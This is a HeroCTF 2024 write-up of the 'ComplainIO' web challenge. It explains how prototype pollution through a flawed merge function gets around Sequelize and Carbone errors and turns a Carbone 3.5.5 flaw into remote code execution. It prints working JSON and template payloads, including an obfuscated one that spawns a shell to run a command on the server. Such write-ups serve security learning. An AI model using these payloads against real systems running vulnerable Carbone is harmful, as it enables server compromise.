---
title: "ComplainIO Writeup"
date: 2024-10-30 15:00
categories: [HeroCTF 2024, Web]
tags: [heroctf, web, prototype pollution, __proto__, nodejs, express, carbone, sequelize]
authors: stefan
description: Leverage prototype pollution to bypass Sequelize and Carbone errors that arise from prototype pollution to finally exploit a Carbone 3.5.5 RCE vulnerability.
image:
    path: /assets/img/writeups/heroctf.png
---

## Challenge Description

As a French person, we love to complain, so I've created a platform to automatically create complaint templates - we can't stop progress!

This challenge had `9` solves and was worth `498` points.

## Solution

### Step 1: Analyzing the Application

We have an Express website that allows us to generate .odt templates for complaints. The application saves user data in a SQLite database using Sequelize and uses Carbone to generate the .odt files by replacing {d.firstname} and {d.lastname} with the user's first and last name.

### Step 2: Finding vulnerabilities

Analyzing the profile creation, we can see that we are allowed to upload any files that will get saved as a .png with a UUID.

```js
let profile_picture_image = req.files.picture;
let new_uuid = uuidv4();
let filename = UPLOADS_DIR + new_uuid+'.png';
profile_picture_image.mv(filename);
```
```js
const created_file = await Files.create({uuid: new_uuid, path: filename, user_id: current_user.id});
```

And, by looking at `files.controller.js` we can see that it takes any file from the files database:
```js
const file = await Files.findOne({where: {uuid: req.body.uuid}});
```
This suggests that we can upload any type of file and have it rendered by carbone:
```js
carbone.render(file.path, data, function(err, result){
```

### Step 3: Finding path to exploit

Now that we know we can render anything, we need to find a way to exploit it. If we look in package.json, we can see that the application uses Carbone 3.5.5, instead of 3.5.6, which is the latest. Heading over to [Github](https://github.com/carboneio/carbone/commit/04f9feb24bfca23567706392f9ad2c53bbe4134e), we can see that Carbone 3.5.5 has a vulnerability where, if the main application has a prototype pollution vulnerability, it can lead to RCE.
```json
  "dependencies": {
    "carbone": "3.5.5",
```

### Step 4: Investigating prototype pollution possibilities

We have control over the file being rendered and we know that Carbone leads to RCE. Now, we have to find a way to get prototype pollution, simple, right? In `utils/index.js` we quickly find this function:
```js
const merge = (obj1, obj2) => {
    for (let key of Object.keys(obj2)) {
      const val = obj2[key];
      if(FORBIDDEN_MODIFIED.includes(key)) {
        continue
      }
      if (typeof obj1[key] !== "undefined" && typeof val === "object") {
        obj1[key] = merge(obj1[key], val);
      } else {
        obj1[key] = val;
      }
    }

    return obj1;
  };
```
Now we have a way to get prototype pollution, either by updating our profile, or submitting a POST request to create_template with differing firstname/lastname:
```js
if(req.body.firstname !== current_user.firstname || req.body.lastname !== current_user.lastname) {
    await utils.update_user(req.body, decoded);
    current_user = await Users.findOne({where: {username: decoded.username}});
}
```
Adding a `__proto__` key to the POST request will allow us to pollute the prototype and get RCE. Technically.
```json
"__proto__": {
  "a;console.log`hacked`;//":1,
}
```
This should work, right? At least according to [this POC](https://archives.pass-the-salt.org/Pass%20the%20SALT/2024/slides/PTS2024-RUMP-02-Templating_Martin.pdf). Adding that proto field and changing the firstname/lastname (to trigger user update) leads to our first challenge:
Sequelize errors.

![Sequelize Error](/assets/img/writeups/complainio/first_error.png)

### Step 5: Bypassing Sequelize errors

The error arises from the fact that our object is enumerable and Sequelize doesn't like that. This is where I got stuck for around 5 hours. Looking through the source code for sequelize, I kept trying and trying different pollutable properties. Setting `attributes` to an array of our correct fields allowed us to bypass first error, but it doesn't work, because the other proto fields end up leaking in the array and causing another error. Analyzing the upload function of the source code in specific, we can see it acts upon a fields array. Setting that to an empty array so that nothing leaks in works! We can now bypass the Sequelize error.

{: .prompt-info }
> Attributes array represents the columns that the model has. By setting it to something, Sequlieze won't enumerate the object anymore, thus bypassing the error. It will error though, because of our pollution which will cause it to search for inexistent columns, such as "attributes" since we polluted with attributes array. Setting fields to an empty array will cause Sequelize to update the model with nothing, resulting in bypassing both errors. There were other ways to achieve this, but this one works, only once. On the next `find` request, it will error and crash.

```json
"__proto__":{
"fields":[
],
"attributes":[
"id","username","password","firstname","lastname"]
},
```

Now, we have another error.

![Carbone Error](/assets/img/writeups/complainio/second_error.png)

### Step 6: Bypassing Carbone errors

This one was a bit simpler to investigate and solve. We follow the stack trace and look through the code:

```js
function findAndSetValidPositionOfConditionalBlocks (xml, descriptor) {
  // TODO performance: flattenXML should be called earlier and used also to find array positions
  var _xmlFlattened = parser.flattenXML(xml);
  for (var _objName in descriptor) {
    var _xmlParts = descriptor[_objName].xmlParts;
    var _conditionalBlockDetected = [];
    var _newParts = [];
    for (var i = 0; i < _xmlParts.length; i++) {
      ...
```

_xmlParts is undefined. Even though it took me longer to realize this, all we needed to do was "create" xmlParts by polluting it with an empty array.

```json
"__proto__":{
  "fields":[],
  "attributes":[
  "id","username","password","firstname","lastname"
  ],
  "xmlParts":[]
}
```

### Step 7: Testing everything

Now that we have bypassed both Sequelize and Carbone errors, we can test our payload. By following the POC and Github commit, we create the following XML file:
```xml
{d.firstname:a;console.log`hacked`;//}
```
Then, we make the POST request to create_template:
```json
{
"__proto__":{
  "a;console.log`hacked`;//":1,
  "fields":[],
  "attributes":["id","username","password","firstname","lastname"],
  "xmlParts":[],
},
"firstname":"team > r0/dev/null","lastname":"best team",
"uuid":"07b184d8-93e6-4750-b781-2b76d2777c75",
"id":22
}
```

And, voila!

![RCE](/assets/img/writeups/complainio/success.png)

### Step 8: Final payload

Now that we finally have RCE and the server provides us with a `getflag` executable, we quickly write a script that does this:

```xml
{d.name:a;x=Object;w=a=x.constructor.call``;w.type='pipe';w.readable=1;w.writable=1;a.file='/bin/sh';a.args=['/bin/sh','-c','/getflag>/app/public/js/flag.txt'];a.stdio=[w,w];ff=Function`process.binding\x28\x22spawn_sync\x22\x29.spawn\x28a\x29.output`;ff.call``//}
```

```json
{
"__proto__":{
  "a;x=Object;w=a=x.constructor.call``;w.type='pipe';w.readable=1;w.writable=1;a.file='/bin/sh';a.args=['/bin/sh','-c','/getflag>/app/public/js/flag.txt'];a.stdio=[w,w];ff=Function`process.binding\\x28\\x22spawn_sync\\x22\\x29.spawn\\x28a\\x29.output`;ff.call``//":1,
  "fields":[],
  "attributes":["id","username","password","firstname","lastname"],
  "xmlParts":[],
},
"firstname":"team > r0/dev/null","lastname":"best team",
"uuid":"07b184d8-93e6-4750-b781-2b76d2777c75",
"id":22
}
```

{: .prompt-info }
The `__proto__` contains `\\` because `\` is an escape character in JSON. We need to escape the escape character.

We submit the request, go to `/js/flag.txt` and get the flag!

## Conclusion

To summarize the steps we took:

1. **Analyzed the Application**: We examined the Express.js application and discovered it uses SQLite with Sequelize ORM for database interactions and Carbone.js for generating document templates.
2. **Identified Vulnerabilities**: We found that the application is using Carbone.js version 3.5.5, which has a known remote code execution (RCE) vulnerability when prototype pollution is possible in the host application.
3. **Exploited Prototype Pollution**: By injecting `__proto__` properties into a POST request, we exploited the `merge` function in `utils/index.js` to pollute the application's prototype, a prerequisite for triggering the Carbone.js vulnerability.
4. **Bypassed Sequelize Errors**: The initial exploitation attempts led to Sequelize errors due to enumerable properties. We mitigated these errors by setting `fields` and `attributes` in the polluted prototype to acceptable values, allowing the ORM to process the request without errors.
5. **Resolved Carbone.js Errors**: We encountered errors from Carbone.js related to undefined properties. By adding an `xmlParts` array to the polluted prototype, we prevented these errors and allowed the rendering process to proceed.
6. **Crafted the Final Payload**: With the prototype pollution in place and errors resolved, we crafted a payload that leveraged the RCE vulnerability in Carbone.js. This allowed us to execute arbitrary commands on the server.
7. **Retrieved the Flag**: By executing commands on the server, we accessed the flag and completed the challenge.

By systematically exploiting the prototype pollution vulnerability and addressing the resulting errors in both Sequelize and Carbone.js, we successfully achieved remote code execution and retrieved the flag.

## Flag

`HERO{m0r3_p0llut10n_pl34s3_456144e3cc5ed95803a2f81baaf3c4bb}`
